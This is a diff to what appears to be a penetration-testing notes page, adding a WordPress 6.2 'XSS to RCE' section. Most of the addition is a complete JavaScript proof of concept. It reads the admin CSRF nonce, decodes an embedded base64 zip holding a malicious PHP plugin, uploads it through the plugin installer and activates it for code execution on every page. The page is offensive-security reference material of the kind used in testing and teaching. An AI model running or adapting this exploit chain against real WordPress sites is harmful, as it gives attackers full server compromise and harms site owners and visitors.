@@ -183,8 +183,60 @@ fetch("/user/settings/account").then(res => res.text()).then(data => {
 
 ## XSS to RCE
 
+### Wordpress - Upload plugin form
+
+{{< details "Proof of Concept" >}}
+Tested on **Wordpress Version 6.2** (2023-04-28)<br>
+*Admin privileges are required.*
+
+Executing the PoC:
+![Executing the PoC](https://i.imgur.com/KX72mGr.png)
+
+Wordpress plugins list:
+![Wordpress plugins list](https://i.imgur.com/UBSI1c5.png)
+
+> The wordpress plugin can be found on [Github](https://github.com/xanhacks/wordpress-rce-plugin/).
+
+RCE on every page:
+![RCE on every page](https://i.imgur.com/Az1bdh3.png)
+
+Proof of Concept code:
+```js
+// 1. Obtain CSRF token
+fetch("/wp-admin/plugin-install.php")
+.then(resp => resp.text())
+.then(htmlResponse => {
+	const htmlDoc = new DOMParser().parseFromString(htmlResponse, "text/html");
+	const csrfToken = htmlDoc.getElementsByClassName("wp-upload-form")[0].getElementsByTagName("input")[0].value;
+
+	// 2. Transform plugin (base64) into blob
+	const b64_plugin_data = "UEsDBBQAAAAIAGdanFYSKsI7lwEAAHMDAAAJABwAaW5kZXgucGhwVVQJAAOSj0tkwY9LZHV4CwABBOkDAAAE6QMAAJ1Sy27bMBA8V1+xEHqwHUt0nSKHNEBfMdwAQeI6j0sRCGuKkYRYJEFSkY2g/16SkmIZyaEwT4udnZnVjs6+ylwGZDQKYATLnzNADQg3TD0XlIFtuv43ifQJMwYAirIIdYSRbkY8jJXJhbIobJDndlb79triXDvWfHEZTePJUdvmT+BfbozUp4RkhcmrVUxFSToBUguVSsW0jpylXFdZwT2dCrlVRZYbmE6mx+O+pcd3xB1p4Su4wpKdNtZvvrU3dre86KYOWvGcaaoKaQrBO53rlUGrjNz72oo9M7WFVwWQ9ryxI98zpXtE9z7Fk3jisO/+zn1o7+AN/L/rO8Yt2xg4F6XdraO8F/BlE2TfuJ9oC/eNna+1res6zngVC5WR9m/QJJNrR43NxvhreXtYoMk7Nlkjzyp7Eb/kvDC/qtVeOIek0sr8UMhp6+SMLUSCANM0QeoSG4S1TB6FMEyFYwibKrFS4fBLEDxW3E/Brj8YwkvwQW+1YeVghZqdfE5SRkXKBh+T5ez33ezm9k9IyzR8GFqJv8E/UEsBAh4DFAAAAAgAZ1qcVhIqwjuXAQAAcwMAAAkAGAAAAAAAAQAAAKSBAAAAAGluZGV4LnBocFVUBQADko9LZHV4CwABBOkDAAAE6QMAAFBLBQYAAAAAAQABAE8AAADaAQAAAAA=";
+	fetch("data:application/zip;base64," + b64_plugin_data)
+	.then(res => res.blob())
+	.then(pluginBlob => {
+		const formData = new FormData();
+		formData.append("_wpnonce", csrfToken);
+		formData.append("_wp_http_referer", "/wp-admin/plugin-install.php");
+		formData.append("pluginzip", pluginBlob, "plugin.zip");
+		formData.append("install-plugin-submit", "Install Now");
+
+		// 3. Upload the malicious plugin
+		fetch("/wp-admin/update.php?action=upload-plugin", {
+			"method": "POST",
+			"body": formData
+		})
+		.then(resp => resp.text())
+		.then(htmlResponse => {
+			const htmlDoc2 = new DOMParser().parseFromString(htmlResponse, "text/html");
+			const link = htmlDoc2.getElementsByClassName("button button-primary")[0].getAttribute("href");
+
+			// 4. Activate the plugin
+			fetch("/wp-admin/" + link);
+		});
+	});
+});
+```
+{{< /details >}}
+
 Todo:
-- Wordpress
 - Drupal
-
-
